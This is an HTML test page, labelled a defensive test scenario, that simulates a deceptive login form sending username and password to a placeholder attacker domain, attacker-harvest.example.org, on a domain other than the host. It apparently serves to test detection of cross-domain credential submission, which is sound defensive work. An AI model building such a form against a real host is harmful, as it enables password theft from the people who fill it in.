<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Test Page: Cross-Domain Password Form Submission</title>
  <style>
    body { font-family: sans-serif; margin: 40px; background: #f4f6f8; color: #222; }
    .box { background: white; padding: 24px; border-radius: 8px; max-width: 480px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
    input { width: 100%; padding: 8px; margin: 8px 0 16px; box-sizing: border-box; }
    button { background: #0284c7; color: white; border: none; padding: 10px 16px; border-radius: 4px; cursor: pointer; }
    .badge { background: #fed7aa; color: #9a3412; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
  </style>
</head>
<body>
  <div class="box">
    <span class="badge">Defensive Test Scenario</span>
    <h2>Cross-Domain Password Submission</h2>
    <p>This page simulates a deceptive login form whose action submits credentials to an entirely different registrable domain (<code>https://attacker-harvest.example.org/login</code>) instead of the hosting domain.</p>

    <!-- Simulated Cross-Origin Action -->
    <form action="https://attacker-harvest.example.org/login" method="POST">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" placeholder="user@example.com">

      <label for="password">Password (Test input only):</label>
      <input type="password" id="password" name="password" placeholder="••••••••">

      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
